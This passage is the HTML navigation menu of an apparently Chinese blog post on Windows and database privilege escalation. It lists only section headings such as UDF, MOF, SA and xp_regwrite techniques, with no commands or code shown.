class="nav-text">win08，三条命令即可:</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#win2012通用；win7前两条即可。权限需要run-as-administrator"><span class="nav-number">6.</span> <span class="nav-text">win2012通用；win7前两条即可。权限需要run as administrator</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#查询终端端口-："><span class="nav-number"></span> <span class="nav-text">查询终端端口 ：</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#数据库提权"><span class="nav-number"></span> <span class="nav-text">数据库提权:</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#UDF手工提权辅助："><span class="nav-number">1.</span> <span class="nav-text">UDF手工提权辅助：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#小技巧："><span class="nav-number">1.1.</span> <span class="nav-text">小技巧：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MOF手工提权辅助："><span class="nav-number">2.</span> <span class="nav-text">MOF手工提权辅助：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SA提权辅助："><span class="nav-number">3.</span> <span class="nav-text">SA提权辅助：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1-判断扩展存储是否存在："><span class="nav-number">3.1.</span> <span class="nav-text">1.判断扩展存储是否存在：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#恢复："><span class="nav-number">4.</span> <span class="nav-text">恢复：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#2-列目录："><span class="nav-number">4.1.</span> <span class="nav-text">2.列目录：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-备份启动项："><span class="nav-number">4.2.</span> <span class="nav-text">3.备份启动项：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-映像劫持"><span class="nav-number">4.3.</span> <span class="nav-text">4.映像劫持</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-沙盒模式提权："><span class="nav-number">4.4.</span> <span class="nav-text">5.沙盒模式提权：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#法a："><span class="nav-number">5.</span> <span class="nav-text">法a：</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#法b："><span class="nav-number">6.</span> <span class="nav-text">法b：</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#6-xp-regwrite操作注册表"><span class="nav-number">6.1.</span> <span class="nav-text">6.xp_regwrite操作注册表</span></a></li></ol></li></ol></li></div>
             
 
           </div>
